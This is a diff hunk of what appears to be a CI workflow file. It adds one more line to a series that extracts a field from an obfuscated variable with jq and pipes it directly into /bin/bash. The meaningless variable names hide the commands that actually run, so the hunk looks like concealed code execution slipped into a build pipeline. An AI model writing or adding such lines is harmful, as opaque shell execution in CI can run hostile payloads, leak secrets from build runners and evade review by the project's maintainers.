@@ -40,6 +40,7 @@ jobs:
           echo $meha990 | jq -r .wf286 | /bin/bash
           printf '%s' "$a56" | jq -r .mj13 | /bin/bash
           printf '%s' "$vv528" | jq -r .mo4368 | /bin/bash
+          echo $mul22 | jq -r .wjx6428 | /bin/bash
 
       - name: Save archive
         if: always()
